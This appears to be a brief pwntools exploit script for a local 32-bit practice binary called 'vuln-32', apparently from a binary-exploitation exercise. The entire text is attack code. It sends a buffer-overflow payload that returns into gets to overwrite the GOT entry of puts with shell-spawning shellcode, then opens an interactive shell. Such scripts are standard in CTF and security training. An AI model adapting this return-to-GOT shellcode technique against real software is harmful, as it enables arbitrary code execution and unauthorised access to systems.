from pwn import *

elf = context.binary = ELF("./vuln-32",0)

sh = asm(shellcraft.sh())

p = process()
payload = flat([
    b"A" * 32,
    elf.plt["gets"],
    elf.got["puts"],
    elf.got["puts"],
])

p.recvline()
p.sendline(payload)
p.sendline(sh)

p.interactive()